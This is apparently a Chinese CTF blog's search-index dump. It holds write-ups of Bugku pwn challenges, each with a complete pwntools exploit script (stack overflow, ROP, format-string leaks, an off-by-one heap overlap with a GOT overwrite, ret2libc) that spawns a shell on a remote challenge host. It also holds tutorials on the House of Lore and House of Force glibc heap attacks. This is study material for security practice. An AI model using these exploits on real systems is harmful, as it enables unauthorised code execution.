{"pages":[{"title":"404","text":"","path":"404/index.html","date":"07-09","excerpt":""},{"title":"about","text":"此人， CTF的二进制蒟蒻 失智刀客塔 于此记录自己的一点一滴成长：） 希望与各位一起进步鸭！ ddddhm","path":"about/index.html","date":"07-09","excerpt":""},{"title":"","text":"暑假结束前的计划 CTF-wiki 堆的学习，以及总结，之前分开写太散了orz bugku pwnable.xyz也做一点orz 暑期比赛的wp","path":"todo/index.html","date":"08-20","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"07-09","excerpt":""}],"posts":[{"title":"不定期更新的WP","text":"嘛，打ctf还是需要一定量的练习的，不管是练手还是学习新知都是极好的。 然后要稍微总结一下做题过程中的小问题，就从简单的题目开始好了，难的题目，正在学啦orz Bugku newpwn2直接nc上去就好了。。。然后cat flag pwn3最基本的栈溢出，啥保护都没开，直接溢出到返回地址控制返回到get_shell_()函数即可 pwn4啥保护都没开，程序有system函数，没有&quot;/bin/sh&quot;命令，漏洞也是栈溢出，那么就利用栈溢出输入命令以后返回到system函数中执行，但是注意程序是64位的，所以参数的传递需要依靠RDI寄存器。 12345678$ checksec pwn4/pwn4 [*] '/home/cmask/Desktop/Bugku/pwn4/pwn4' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments 看看主函数内容 123456789101112__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-10h] memset(&amp;s, 0, 0x10uLL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); puts(\"Come on,try to pwn me\"); read(0, &amp;s, 0x30uLL); puts(\"So~sad,you are fail\"); return 0LL;&#125; 可以发现溢出的只有0x18个字节，需要完成的布置有 把&quot;/bin/sh&quot;输入到一个地址不变的位置（比如.data段） 程序再次运行，将&quot;/bin/sh&quot;的地址赋给RDI，然后返回到system函数处执行 实际操作的时候发现 12345.text:000000000040072A lea rax, [rbp+s] ; s = -0x10.text:000000000040072E mov edx, 30h ; nbytes.text:0000000000400733 mov rsi, rax ; buf.text:0000000000400736 mov edi, 0 ; fd.text:000000000040073B call _read 发现read的buf是通过rbp-0x10来计算的，这样我们只需要把rbp设置成tar_addr + 0x10就行了，这个可以通过栈溢出直接设置rbp得到，然后返回地址设置成main就可以重新运行。 然后寻找一个合适的gadget，设置rdi，然后返回到system函数就能执行 123456789101112131415Gadgets information============================================================0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007d0 : pop r14 ; pop r15 ; ret0x00000000004007d2 : pop r15 ; ret0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400630 : pop rbp ; ret0x00000000004007d3 : pop rdi ; ret0x00000000004007d1 : pop rsi ; pop r15 ; ret0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400541 : retUnique gadgets found: 11 这里选择0x00000000004007d3处的gadget，payload设置为padding(0x18) + gadget + data_addr + system_addr 但是在写好exp之后发现还有点问题，那就是由于延迟绑定，我们之前修改rbp的时候返回到read时，程序还会再次返回，这样回修改rsp的值，这时栈的位置就被修改到data段了，但是在延迟绑定的时候，会用到栈的一个比较大的空间，就会导致地址溢出，程序崩溃返回。怎么解决呢？那就是让它先绑定，我们再调用。 在第一次读&quot;/bin/sh&quot;的时候，还剩下8字节没有利用，恰好可以调用一次system，然后返回到read。这样就搞定啦。 exp如下 12345678910111213141516171819202122232425262728#!/usr/bin/python#-*- coding:utf-8 -*-from pwn import *import sysif len(sys.argv) == 1 or sys.argv[1] == 'g': p = process('./pwn4') if len(sys.argv) != 1: gdb.attach(p)else: p = remote('114.116.54.89',10004)func_addr = 0x400751vul_addr = 0x601315read_addr = 0x400720tar_addr = 0x40075Apop_rdi = 0x4007d3p.recvuntil('Come on,try to pwn me\\n')payload = '\\x00'*0x10 + p64(vul_addr+0x10) + p64(func_addr) + p64(read_addr)p.sendline(payload)p.recvuntil('Come on,try to pwn me\\n')payload = '/bin/sh\\x00'.ljust(0x18,'\\x00') + p64(pop_rdi) + p64(vul_addr) + p64(tar_addr)p.sendline(payload)p.interactive() pwn5先查看一下保护 1234567$ checksec pwn5/human [*] '/home/cmask/Desktop/Bugku/pwn5/human' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 只开了部分写保护和栈不可执行。 看一下程序 12345678910111213141516171819202122232425int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [rsp+0h] [rbp-20h] setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 1, 0LL); memset(&amp;s, 0, 0x20uLL); puts(&amp;byte_400958); // 人类的本质是什么 read(0, &amp;s, 8uLL); printf(&amp;s, &amp;s); puts(&amp;s); puts(&amp;s); puts(&amp;s); puts(&amp;byte_400978); // 一位群友打烂了复读机 sleep(1u); puts(byte_400998); read(0, &amp;s, 0x40uLL); // 人类还有什么本质 if ( !strstr(&amp;s, &amp;byte_4009B3) || !strstr(&amp;s, &amp;byte_4009BA) )// 鸽子 真香 &#123; puts(&amp;byte_4009C8); // 你并没有理解人类的本质 exit(0); &#125; puts(&amp;byte_4009F8); // 人类的三大本质：复读机，鸽子，真香 return 0;&#125; 程序有一次格式化字符串漏洞和一次栈溢出，溢出大小为0x18。同时注意到格式化字符串参数只有8个字节。目前的思路为： 通过格式化字符串漏洞，泄露libc地址。 寻找one gadget，通过修改返回地址get shell 首先通过调试，查看栈上是否有什么有趣的东西，我们知道由于调用，栈上应该保存了__libc_start_main相关的地址。 12345678910111213141516171819202122232425262728293031323334353637──────[ DISASM ]─────── ► 0x7ffff7a62800 &lt;printf&gt; sub rsp, 0xd8 0x7ffff7a62807 &lt;printf+7&gt; test al, al 0x7ffff7a62809 &lt;printf+9&gt; mov qword ptr [rsp + 0x28], rsi 0x7ffff7a6280e &lt;printf+14&gt; mov qword ptr [rsp + 0x30], rdx 0x7ffff7a62813 &lt;printf+19&gt; mov qword ptr [rsp + 0x38], rcx 0x7ffff7a62818 &lt;printf+24&gt; mov qword ptr [rsp + 0x40], r8 0x7ffff7a6281d &lt;printf+29&gt; mov qword ptr [rsp + 0x48], r9 0x7ffff7a62822 &lt;printf+34&gt; je printf+91 &lt;0x7ffff7a6285b&gt; ↓ 0x7ffff7a6285b &lt;printf+91&gt; lea rax, [rsp + 0xe0] 0x7ffff7a62863 &lt;printf+99&gt; mov rsi, rdi 0x7ffff7a62866 &lt;printf+102&gt; lea rdx, [rsp + 8]───────[ STACK ]───────00:0000│ rsp 0x7fffffffdde8 —▸ 0x400821 (main+139) ◂— lea rax, [rbp - 0x20]01:0008│ rdi rsi 0x7fffffffddf0 ◂— 0xa333231 /* &apos;123\\n&apos; */02:0010│ 0x7fffffffddf8 ◂— 0x0... ↓05:0028│ rbp 0x7fffffffde10 —▸ 0x4008d0 (__libc_csu_init) ◂— push r1506:0030│ 0x7fffffffde18 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov edi, eax07:0038│ 0x7fffffffde20 ◂— 0x1─────[ BACKTRACE ]───── ► f 0 7ffff7a62800 printf f 1 400821 main+139 f 2 7ffff7a2d830 __libc_start_main+240───────────────────────pwndbg&gt; x/20xg $rsp0x7fffffffdde8: 0x0000000000400821 0x000000000a3332310x7fffffffddf8: 0x0000000000000000 0x00000000000000000x7fffffffde08: 0x0000000000000000 0x00000000004008d00x7fffffffde18: 0x00007ffff7a2d830 0x00000000000000010x7fffffffde28: 0x00007fffffffdef8 0x00000001f7ffcca00x7fffffffde38: 0x0000000000400796 0x00000000000000000x7fffffffde48: 0xefbb4683d2af65fd 0x00000000004006a00x7fffffffde58: 0x00007fffffffdef0 0x00000000000000000x7fffffffde68: 0x0000000000000000 0x1044b9fc7f4f65fd0x7fffffffde78: 0x1044a9466cdf65fd 0x0000000000000000 可以发现，栈上0x7fffffffde18存着__libc_start_main+240的值，这样就能通过计算偏移，然后就能得到__libc_start_main的地址。通过计算，我们可以得到用来得到地址的字符串应该是%11$llx。 exp如下 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/python#-*- coding:utf-8 -*-from pwn import *import sysimport LibcSearcherif len(sys.argv) == 1 or sys.argv[1] == 'g': p = process('./human') if len(sys.argv) != 1: gdb.attach(p)else: p = remote('114.116.54.89',10005)p.recvuntil('人类的本质是什么?\\n')payload ='%11$llx'p.sendline(payload)p.recvuntil('\\n')num = p.recv(12)#log.info('recv 0x'+num)libc_main_addr = int('0x'+num,16) - 0xf0log.success('__libc_start_main '+hex(libc_main_addr))libc = LibcSearcher.LibcSearcher('__libc_start_main',libc_main_addr)libc_base = libc_main_addr - libc.dump('__libc_start_main')#0: 0x45206 0x4525a 0xef9f4 0xf0897#1: 0x45216 0x2526a 0xf02a4 0xf1147one_gadget = 0x45216one_addr = libc_base + one_gadgetp.recvuntil('人类还有什么本质?\\n')payload = '\\xe9\\xb8\\xbd\\xe5\\xad\\x90\\xe7\\x9c\\x9f\\xe9\\xa6\\x99\\x00'.ljust(0x28,'\\x00') + p64(one_addr)p.sendline(payload)p.interactive() pwn6这是个堆题，先查看一下保护 1234567$ checksec pwn6/heap1 [*] '/home/cmask/Desktop/Bugku/pwn6/heap1' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 观察一下程序，实现了一个记事本的功能，有新建、修改、删除、查看功能。 发现在edit函数功能中有个off by one漏洞 123456789101112131415161718192021222324252627unsigned __int64 edit()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"input the id of note :\"); read(0, &amp;buf, 4uLL); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(\"error!\"); _exit(0); &#125; if ( ptr[v1] ) &#123; printf(\"input your note : \", &amp;buf); my_read(*((void **)ptr[v1] + 1), *(_QWORD *)ptr[v1] + 1LL); //off by one puts(\"has done !\"); &#125; else &#123; puts(\"no such note !\"); &#125; return __readfsqword(0x28u) ^ v3;&#125; 程序限制最多有10个记录，在新建记录的时候，会malloc(0x10)作为索引，前8字节存储大小，后8字节存储malloc(size)指针，然后内容存储在分配的chunk中。删除的时候会清空指针，所以没有uaf。 通过off by one，得到大致利用思路为 通过修改堆块的size域，然后free后再malloc，造成堆块重叠，覆盖掉某一个索引，这样可以实现任意地址写。 通过任意地址写，先泄露libc的地址，然后再通过任意地址写，把free函数的got表改写为system函数的地址 预先设置一个记录内容为&quot;/bin/sh&quot;，改写free的got表后释放该记录，就能get shell 堆块重叠情况示意 这样块2的索引我们就能控制了 exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/python#-*- coding:utf-8 -*-from pwn import *import sysimport LibcSearcherif len(sys.argv) == 1 or sys.argv[1] == 'g': p = process('./heap1') if len(sys.argv) != 1: gdb.attach(p,'b *0x400dcb\\nc')else: p = remote('114.116.54.89',10006)elf = ELF('./heap1')free_got = elf.got['free']def create(size, content): p.recvuntil('input your choice :') p.sendline('1') p.recvuntil('input the size of note :') p.sendline(str(size)) p.recvuntil('Content of note:') p.sendline(content) p.recvuntil('has done')def edit(index, content): p.recvuntil('input your choice :') p.sendline('2') p.recvuntil('input the id of note :') p.sendline(str(index)) p.recvuntil('input your note : ') p.sendline(content) p.recvuntil('has done !')def show(index): p.recvuntil('input your choice :') p.sendline('3') p.recvuntil('input the id of note :') p.sendline(str(index)) p.recvuntil('Content : ') ret = p.recvuntil('\\nDone !') return retdef delete(index): p.recvuntil('input your choice :') p.sendline('4') p.recvuntil('input the id of note :') p.sendline(str(index)) p.recvuntil('has done !')create(0x18,'1')create(0x20,'2')create(0x18,'3')create(0x10,'4')create(0x10,'/bin/sh')payload = '\\x00'*0x18+'\\x91'edit(0,payload)delete(1)create(0x60,'a'*8)payload = 'a'*0x30 + p64(0x18) + p64(free_got)edit(1,payload)free_addr = u64(show(2)[:6].ljust(8,'\\x00'))log.success('free '+hex(free_addr))libc = LibcSearcher.LibcSearcher('free',free_addr)libc_base = free_addr - libc.dump('free')sys_addr = libc_base + libc.dump('system')log.success('system '+hex(sys_addr))edit(2,p64(sys_addr))p.recvuntil('input your choice :') p.sendline('4')p.recvuntil('input the id of note :')p.sendline('4')p.interactive() pwn8pwn8看起来是一个基础的ret2libc的题，事实上直接按照ret2libc的方式写本地就能get shell，但是远程不知道为啥不可以，自己试了试感觉应该是远程的缓冲区设置有一点点问题，远程需要先输入才有“ret2libc play”的欢迎语，就有点奇怪orz 至于对返回地址的判断，由于使用的是int类型的，所以过大的地址，比如system的地址，会被认为是负数orz，相当于这个判断没有起作用。 exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/python#-*- coding:utf-8 -*-from pwn import *import LibcSearcherimport sysif len(sys.argv) == 1: p = process('./pwn8')elif sys.argv[1] == 'g': p = process('./pwn8') gdb.attach(p)else: p = remote('114.116.54.89',10008)context.log_level = 'debug'elf = ELF('./pwn8')puts_got = elf.got['puts']puts_plt = elf.plt['puts']main_addr = 0x080484A1mid_addr = 0x080484A0log.info('got '+hex(puts_got))log.info('plt '+hex(puts_plt))p.recvuntil('ret2libc play\\n')payload = '\\x00'*0x14 + p32(puts_plt) + p32(main_addr) + p32(puts_got)p.sendline(payload)puts_addr = u32(p.recv(4))log.info('puts '+hex(puts_addr))libc = LibcSearcher.LibcSearcher('puts',puts_addr)libc_base = puts_addr - libc.dump('puts')sys_addr = libc_base + libc.dump('system')str_addr = libc_base + libc.dump('str_bin_sh')log.info('system '+hex(sys_addr))payload = '\\x00'*0x14 + p32(sys_addr) + p32(main_addr) + p32(str_addr)p.recvuntil('ret2libc play\\n')p.sendline(payload)p.interactive() pwn9这就是一个典型的格式化字符串的题，而且程序也给了get shell的函数，也没开PIE，就只需要把需要修改的位置放置到栈上，然后通过格式化字符串漏洞的利用方式修改就行。 但是，问题就是，不知道栈地址就不能修改到返回地址，那咋整呢。 那么，看到程序开了canary保护，这样，我们可以修改__stack_chk_fail函数的got表呀，把其修改成目标函数的地址，然后我们触发canary，这样程序就会执行__stack_chk_fail函数，这样，就能执行我们希望的函数了。 exp如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/python#-*- coding:utf-8 -*-from pwn import *import sysif len(sys.argv) == 1: p = process('./babyfmt')elif sys.argv[1] == 'g': p = process('./babyfmt') gdb.attach(p,'b *0x400664\\nc')else: p = remote('114.116.54.89',10009)def get_cmd(value, position): if len(value) != len(position): return 'Length unmatch' book = &#123;&#125; for (i,j) in zip(value, position): book[i] = j value.sort() offset = [value[0]] for i in range(1,len(value)): offset.append(value[i]-value[i-1]) cmd = '' for i in range(len(offset)): cmd += '%0'+str(offset[i]) + 'c%' + str(book[value[i]]) + '$hhn' return cmdfini_arr = 0x601018vul_addr = ''.join(p64(fini_arr + i) for i in range(3))tar_addr = 0x400626val = [0x26,0x06,0x40]pos = [12,13,14]cmd = get_cmd(val,pos)log.success(cmd)log.info('len '+hex(len(cmd)))payload = cmd.ljust(0x30,'\\x00') + vul_addrsleep(1)p.sendline(payload.ljust(0x60,'\\x00'))p.interactive() pwn11同样，先查看一下保护 1234567$ checksec f4n_pwn [*] '/home/cmask/Desktop/Bugku/pwn11/f4n_pwn' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序本身有点复杂，但是在最开始的函数中就有栈溢出的漏洞，然后程序也没有开canary保护。 123456789101112131415161718192021222324252627int read_name()&#123; char s[80]; // [esp+8h] [ebp-60h] unsigned int v2; // [esp+58h] [ebp-10h] unsigned int i; // [esp+5Ch] [ebp-Ch] memset(s, 0, 0x50u); __isoc99_scanf(\"%ld\", &amp;v2); if ( (signed int)v2 &gt; 48 ) &#123; puts(\"too long!!! u are a hacker!!!\"); exit(0); &#125; puts(\"please tell me your name : \"); fflush(stdout); fflush(stdin); for ( i = 0; i &lt; v2; ++i ) &#123; read(0, &amp;s[i], 1u); if ( s[i] == 10 ) &#123; s[i] = 0; return printf(\"helllo %s\\n\", s); &#125; &#125; return printf(\"helllo %s\\n\", s);&#125; 可以发现，虽然v2是unsigned int类型，但是在比较的时候，是转换成signed int类型。这样，如果输入-1，那么就可以输入4294967295个字符，这样，我们就能直接返回到目标函数了。 exp如下 12345678910111213141516171819202122232425#!/usr/bin/python#-*- coding:utf-8 -*-from pwn import *import sysif len(sys.argv) == 1: p = process('./f4n_pwn')elif sys.argv[1] == 'g': p = process('./f4n_pwn') gdb.attach(p,'b *0x0804879E\\n')else: p = remote('114.116.54.89',10011)tar_addr = 0x080486BBp.recvuntil('input your name length : \\n')p.sendline('-1')p.recvuntil('please tell me your name : \\n')payload = 'a'*0x50 + '\\xff\\xff\\xff\\xff' + p32(0x58) + 'a'*0x8 + p32(tar_addr)p.sendline(payload)p.interactive() 小结题目还没写完啊，主要是有些知识点还没弄懂，基础一点有ret2dlresolve，以及IO_file的操作，我IO_file的利用连例子都没成功orz。。。 还是太菜了。。。","path":"2019/08/16/Irregular_write_up/","date":"08-16","excerpt":"嘛，打ctf还是需要一定量的练习的，不管是练手还是学习新知都是极好的。 然后要稍微总结一下做题过程中的小问题，就从简单的题目开始好了，难的题目，正在学啦orz"},{"title":"Day6 - House of Lore","text":"emmm，虽然都是day6，到时候再总结好了。。。毕竟每天也就一点点2333，而且还有题目没补orz。。。怎么这么菜qaq 参考 CTF wiki 原理House of Lore攻击与Glibc堆管理中的Samll Bin的机制紧密相关。 House of Lore可以实现分配任意指定的chunk，从而修改任意地址的内存。 House of Lore利用的前提是需要控制Samll Bin Chunk的bk指针，并且控制指定位置chunk的fd指针。 如果在malloc的时候，申请的内存块为small bin，那么执行流程如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */if (in_smallbin_range(nb)) &#123; // 获取 small bin 的索引 idx = smallbin_index(nb); // 获取对应 small bin 中的 chunk 指针 bin = bin_at(av, idx); // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk // 如果 victim = bin ，那说明该 bin 为空。 // 如果不相等，那么会有两种情况 if ((victim = last(bin)) != bin) &#123; // 第一种情况，small bin 还没有初始化。 if (victim == 0) /* initialization check */ // 执行初始化，将 fast bins 中的 chunk 进行合并 malloc_consolidate(av); // 第二种情况，small bin 中存在空闲的 chunk else &#123; // 获取 small bin 中倒数第二个 chunk 。 bck = victim-&gt;bk; // 检查 bck-&gt;fd 是不是 victim，防止伪造 if (__glibc_unlikely(bck-&gt;fd != victim)) &#123; errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; &#125; // 设置 victim 对应的 inuse 位 set_inuse_bit_at_offset(victim, nb); // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来 bin-&gt;bk = bck; bck-&gt;fd = bin; // 如果不是 main_arena，设置对应的标志 if (av != &amp;main_arena) set_non_main_arena(victim); // 细致的检查 check_malloced_chunk(av, victim, nb); // 将申请到的 chunk 转化为对应的 mem 状态 void *p = chunk2mem(victim); // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff alloc_perturb(p, bytes); return p; &#125; &#125;&#125; 可以看到，如果能控制small bin的最后一个chunk的bk为fake chunk，并且修改fake chunk -&gt; fd使得bck-&gt;fd == victim以通过检查。那么下一次分配的时候，我们就能分配到指定位置的fake chunk。 栗子示例代码来自shellphish的how to hep 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void jackpot()&#123; puts(\"Nice jump d00d\"); exit(0); &#125;int main(int argc, char * argv[])&#123; intptr_t* stack_buffer_1[4] = &#123;0&#125;; intptr_t* stack_buffer_2[3] = &#123;0&#125;; fprintf(stderr, \"\\nWelcome to the House of Lore\\n\"); fprintf(stderr, \"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\"); fprintf(stderr, \"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\\n\\n\"); fprintf(stderr, \"Allocating the victim chunk\\n\"); intptr_t *victim = malloc(100); fprintf(stderr, \"Allocated the first small chunk on the heap at %p\\n\", victim); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t *victim_chunk = victim-2; fprintf(stderr, \"stack_buffer_1 at %p\\n\", (void*)stack_buffer_1); fprintf(stderr, \"stack_buffer_2 at %p\\n\", (void*)stack_buffer_2); fprintf(stderr, \"Create a fake chunk on the stack\\n\"); fprintf(stderr, \"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\" \"in second to the last malloc, which putting stack address on smallbin list\\n\"); stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; fprintf(stderr, \"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \" \"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \" \"chunk on stack\"); stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr, \"Allocating another large chunk in order to avoid consolidating the top chunk with\" \"the small one during the free()\\n\"); void *p5 = malloc(1000); fprintf(stderr, \"Allocated the large chunk on the heap at %p\\n\", p5); fprintf(stderr, \"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\", victim); free((void*)victim); fprintf(stderr, \"\\nIn the unsorted bin the victim's fwd and bk pointers are nil\\n\"); fprintf(stderr, \"victim-&gt;fwd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]); fprintf(stderr, \"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\"); fprintf(stderr, \"This means that the chunk %p will be inserted in front of the SmallBin\\n\", victim); void *p2 = malloc(1200); fprintf(stderr, \"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\", p2); fprintf(stderr, \"The victim chunk has been sorted and its fwd and bk pointers updated\\n\"); fprintf(stderr, \"victim-&gt;fwd: %p\\n\", (void *)victim[0]); fprintf(stderr, \"victim-&gt;bk: %p\\n\\n\", (void *)victim[1]); //------------VULNERABILITY----------- fprintf(stderr, \"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n\"); victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, \"Now allocating a chunk with size equal to the first one freed\\n\"); fprintf(stderr, \"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n\"); void *p3 = malloc(100); fprintf(stderr, \"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n\"); char *p4 = malloc(100); fprintf(stderr, \"p4 = malloc(100)\\n\"); fprintf(stderr, \"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\", stack_buffer_2[2]); fprintf(stderr, \"\\np4 is %p and should be on the stack!\\n\", p4); // this chunk will be allocated on stack intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary&#125; 需要注意的地方： 要防止free的chunk合并到top chunk中 对于在unsorted bin中的chunk，如果申请的chunk大于该chunk，那么就会从top chunk中分割新的chunk返回，该chunk被放入对应的bin中。如果申请的chunk小于该chunk，那么该chunk会被分割，剩余部分仍然在unsorted bin中。","path":"2019/07/22/day6_houseoflore/","date":"07-22","excerpt":"emmm，虽然都是day6，到时候再总结好了。。。毕竟每天也就一点点2333，而且还有题目没补orz。。。怎么这么菜qaq"},{"title":"Day6 - House of Force","text":"先把知识点刷完，然后做题练习，加油orz 参考 CTF wiki 原理House of Force的使用，主要是跟top chunk相关。通过修改top chunk的size为一个很大的值（-1），然后通过malloc修改top chunk指针的位置，从而实现任意地址任意写。 在glibc中，会对用户请求的大小和top chunk的size进行验证 123456789101112131415161718// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p;&#125; 如果能把size改成一个很大的值，这样就能轻松通过验证。一般来说会把top chunk的size改成-1，因为比较是无符号数的比较，因此-1就是最大的unsigned long的值。 12remainder = chunk_at_offset(victim, nb);av-&gt;top = remainder; 通过验证以后，top chunk的指针就会更新，这样接下来申请的堆块就会分配到这个位置。即用户如果控制了av-&gt;top这个指针，就能实现任意地址任意写。 同时，top chunk的size也会更新 1234victim = av-&gt;top;size = chunksize(victim);remainder_size = size - nb;set_head(remainder, remainder_size | PREV_INUSE); 所以在进行分配的时候，需要计算号remainder_size的值，要确保其大于下次分配的大小+MINSIZE。 在修改好top chunk的size之后，接下来的malloc就是为了修改top chunk的指针指向想要改写的位置。 对于用户分配大小的计算 1234567891011121314151617181920212223/* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */#define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))/* pad request bytes into a usable size -- internal version *///MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1#define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)/* Same, except also perform argument check */#define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) &#123; \\ __set_errno(ENOMEM); \\ return 0; \\ &#125; \\ (sz) = request2size(req); 首先要先通过REQUEST_OUT_OF_RANGE(req)这个检测，即我们传给malloc的值在负数范围内，不得大于-2*MINSIEZ，这个一般都是可以满足的。 同时，我们需要使得request2size正好转换为对应的大小，也就是使得((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK正好我们想要的大小。 还有就是，在top chunk被修改的同时，其目标位置附近的内容也会被修改。 12set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); 总结 House of Force的利用条件还是很苛刻的。 需要存在一些漏洞来控制top chunk的size域 需要用户能够自定义malloc分配的大小 分配的次数不能够限制 一般来说，程序都会控制malloc分配的上下限。所以条件还是很麻烦滴。 栗子一个例子 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123; unsigned long long int *p = malloc(0x10); p[3] = -1; malloc(0x601018 - 0x602020 - 0x10); void *tar = malloc(0x10); //printf(\"%p\",tar); return 0;&#125; 这个程序目标是修改malloc@got.plt，已知malloc@got.plt在0x601028处，在分配完第一个chunk之后，内存如下 12340x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000020fe1 &lt;== top chunk0x602030: 0x0000000000000000 0x0000000000000000 修改后 12340x602000: 0x0000000000000000 0x00000000000000210x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0xffffffffffffffff &lt;== top chunk0x602030: 0x0000000000000000 0x0000000000000000 可以看到top chunk的位置在0x602020处，这样我们计算偏移的时候为(0x601028-0x10) - 0x602020 - 0x10。然后进行malloc。在这次malloc之前，可以看到top chunk的位置还是正常的 12345670x7ffff7dd1b20 &lt;main_arena&gt;: 0x0000000100000000 0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000 0x0000000000602020 &lt;== top chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000 0x00007ffff7dd1b78 在malloc之后，top chunk的位置已经修改了 12345670x7ffff7dd1b20 &lt;main_arena&gt;: 0x0000000100000000 0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000 0x0000000000601010 &lt;== top chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x0000000000000000 0x00007ffff7dd1b78 